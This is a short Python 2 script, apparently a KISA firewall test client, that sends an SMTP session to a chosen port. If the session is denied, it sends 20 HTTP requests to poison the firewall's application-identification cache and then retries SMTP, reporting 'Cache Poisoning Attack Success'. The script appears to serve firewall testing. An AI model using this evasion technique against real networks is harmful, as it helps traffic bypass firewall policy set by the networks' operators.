
import socket, time, sys

client_to_server = """(Client-to-Server)\n"""
server_to_client = """(Server-to-Client)\n"""
socket.setdefaulttimeout(5)


def HTTP_Request(cs):
    http_request="""GET /index.html HTTP/1.1
User-Agnet: Mozilla 5.0 Compatible
Accept: */*
Host: www.kisa.or.kr
Connection: Keep-Alive\r\n\r\n"""
    print client_to_server+http_request
    cs.send(http_request)

def SMTP(cs):

    data = cs.recv(1024)   #"250 Hello mail.test_NGFW.org\n"
    #if not data : break
    print server_to_client+data

    print client_to_server+"MAIL FROM:<kisa@test_NGFW.org>\n"
    cs.send("MAIL FROM:<kisa@test_NGFW.org>\n")

    time.sleep(2)
    data = cs.recv(1024)   #"250 OK\n"
    print server_to_client+data


    print client_to_server+"RCPT TO:<kisa2@test_NGFW.org>\n"
    cs.send("RCPT TO:<kisa2@test_NGFW.org>\n")

    time.sleep(2)
    data = cs.recv(1024)   #"250 OK\n"
    print server_to_client+data

    print client_to_server+"DATA\n"
    cs.send("DATA\n")


    time.sleep(2)
    data = cs.recv(1024)   #354 End data with <CR><LF>.<CR><LF>\n
    print server_to_client+data

    sendData = """FROM: Test <kisa@test_NGFW.org>
To: kisa2 <kisa2@test_NGFW.org>
Subject: TEST
This is just a test
.
"""
    print client_to_server+sendData
    cs.send(sendData)


    time.sleep(5)

    data = cs.recv(1024)   #250 OK\n
    print server_to_client+data

    print client_to_server+"QUIT\n"
    cs.send("QUIT\n")

    time.sleep(2)
    data = cs.recv(1024)   #221 Bye\n
    print server_to_client+data


#========================================================================

def main():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        host = raw_input("host? ")
        port = int(raw_input("port? "))
        cs.connect((host, port))
        cs.setblocking(0)
    except:
        print "\n\n[!] Can't Find Server........\n\n"
        sys.exit()

    try:
        print "\n\n Send SMTP \n\n"
        cs.settimeout(10)
        SMTP(cs)
        cs.close()

    except:
        print "timeout"

        #cs.close()
        print "\n[*] SMTP - Deny"

        print "\n[!] Starting App Cache Poisoning.....\n\n"
        print "\nFirst : HTTP Request/Response 20 times\n"

        time.sleep(5)
        for i in range(20):
            time.sleep(1)
            print str(i+1)+")"
            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cs.connect((host, port))
            cs.setblocking(0)
            cs.settimeout(10)

            HTTP_Request(cs)
            #time.sleep(2)
            data = cs.recv(1024)
            print server_to_client+data
            cs.close()

        print "\n\nSecond : SMTP\n"
        cs2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cs2.connect((host, port))
        cs2.setblocking(0)
        cs2.settimeout(10)
        #time.sleep(2)
        try:
            SMTP(cs2)
            cs2.close()
            print "Cache Poisoning Attack Success"
        except:
            print "timeout"

            cs2.close()
            print "\n[*] SMTP - Deny"



if __name__ == '__main__':
    main()
